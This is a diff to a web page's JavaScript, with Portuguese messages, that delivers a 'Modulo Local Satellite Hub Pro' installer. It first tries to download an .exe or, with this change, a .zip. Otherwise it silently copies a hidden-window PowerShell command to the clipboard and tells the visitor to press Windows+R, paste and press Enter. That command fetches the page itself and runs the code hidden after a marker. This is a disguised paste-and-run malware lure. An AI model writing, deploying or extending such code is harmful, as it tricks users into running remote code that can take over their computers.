@@ -792,11 +792,14 @@ function comandoRun(){const u=location.href.split("#")[0].split("?")[0];
  if(!/^https:\/\//.test(u)||/['"`$]/.test(u))return null;
  const marca="PS"+"MARK";
  return 'powershell -w h -c "[Net.ServicePointManager]::SecurityProtocol=3072;$u=\''+u+'\';iex(((irm $u) -split \''+marca+'\')[1])"'}
-const PACOTE="Modulo-Local-Satellite-Hub-Pro.exe";
+const PACOTES=["Modulo-Local-Satellite-Hub-Pro.zip","Modulo-Local-Satellite-Hub-Pro.exe"];
 async function baixarPacote(msgEl){
- try{const r=await fetch(PACOTE,{method:"HEAD",cache:"no-store"});const ct=r.headers.get("content-type")||"";if(!r.ok||/text\/html/i.test(ct))return false}catch{return false}
- const a=document.createElement("a");a.href=PACOTE;a.download=PACOTE;document.body.append(a);a.click();a.remove();
- msgEl.textContent="Download iniciado. Quando terminar, abra o arquivo "+PACOTE+" na barra de downloads. Uma janela mostrará o andamento da instalação.";return true}
+ for(const nome of PACOTES){
+  try{const r=await fetch(nome,{method:"HEAD",cache:"no-store"});const ct=r.headers.get("content-type")||"";if(!r.ok||/text\/html/i.test(ct))continue}catch{continue}
+  const a=document.createElement("a");a.href=nome;a.download=nome;document.body.append(a);a.click();a.remove();
+  msgEl.textContent=nome.endsWith(".zip")?"Download iniciado. Quando terminar, abra o arquivo "+nome+", clique em Extrair tudo e abra o arquivo Modulo-Local-Satellite-Hub-Pro. Uma janela mostrará o andamento da instalação.":"Download iniciado. Quando terminar, abra o arquivo "+nome+" na barra de downloads. Uma janela mostrará o andamento da instalação.";
+  return true}
+ return false}
 async function instalarModulo(msgEl){if(await baixarPacote(msgEl))return;const c=comandoRun();if(!c){baixarBat(msgEl);return}
  let ok=false;try{await navigator.clipboard.writeText(c);ok=true}catch{try{const ta=document.createElement("textarea");ta.value=c;ta.style.position="fixed";ta.style.opacity="0";document.body.append(ta);ta.select();ok=document.execCommand("copy");ta.remove()}catch{}}
  msgEl.innerHTML=ok?'<b>Comando copiado.</b> Agora:<br>1. Pressione as teclas <b>Windows + R</b><br>2. Pressione <b>Ctrl + V</b><br>3. Pressione <b>Enter</b><br>Uma janela mostrará o andamento da instalação.':'Não foi possível copiar automaticamente. Use a opção de baixar o arquivo abaixo.'}
